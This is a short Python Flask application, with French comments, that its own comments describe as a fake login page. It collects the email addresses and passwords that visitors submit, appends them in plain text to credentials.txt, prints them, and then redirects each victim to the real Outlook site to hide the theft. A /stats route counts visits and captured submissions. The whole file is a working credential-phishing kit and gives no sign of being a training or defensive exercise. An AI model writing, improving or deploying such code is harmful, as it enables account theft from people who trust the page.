﻿from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Variables pour stocker les statistiques
total_visits = 0
total_submissions = 0

# Route qui affiche la fausse page de connexion
@app.route("/")
def login_page():
    global total_visits
    total_visits += 1  # Incrémenter le compteur de visites
    return render_template("login.html")

# Route qui récupère les identifiants saisis et les stocke
@app.route("/submit", methods=["POST"])
def submit():
    global total_submissions
    total_submissions += 1  # Incrémenter le compteur de soumissions
    
    email = request.form["email"]
    password = request.form["password"]
    
    # Enregistrer les identifiants dans un fichier texte
    with open("credentials.txt", "a") as file:
        file.write(f"Email: {email} | Password: {password}\n")
    
    print(f"Identifiants reçus - Email: {email}, Password: {password}")
    
    # Redirige l'utilisateur vers le vrai site Outlook
    return redirect("https://outlook.live.com/")

# Route pour afficher les statistiques
@app.route("/stats")
def stats():
    return f"Nombre total de visites : {total_visits}<br>Nombre total de soumissions : {total_submissions}"

# Lancer le serveur Flask
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=True)
